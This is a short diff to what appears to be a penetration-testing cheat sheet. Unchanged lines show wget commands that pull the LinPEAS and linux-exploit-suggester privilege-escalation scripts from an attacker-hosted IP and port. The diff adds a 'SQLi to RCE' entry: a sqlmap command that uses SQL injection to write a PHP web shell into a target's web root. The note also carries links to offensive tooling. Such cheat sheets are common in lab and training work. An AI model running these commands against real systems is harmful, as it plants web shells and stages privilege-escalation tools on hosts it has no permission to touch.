@@ -25,6 +25,12 @@ wget http://69.69.69.69:899/linpeas.sh
 wget http://69.69.69.69:899/linux-exploit-suggester.sh
 ``` 
 
+SQLi to RCE
+```python
+sqlmap.py -u "http://192.168.1.69:6969/logs/search?q='" --file-write="C:\Users\MYUSER-FU\Downloads\shell.php" --file-dest="/var/www/html/shell.php"
+```
+
+
 * LinPEAS = https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 * LES = https://github.com/The-Z-Labs/linux-exploit-suggester
 * GTFObins = https://gtfobins.org/gtfobins/
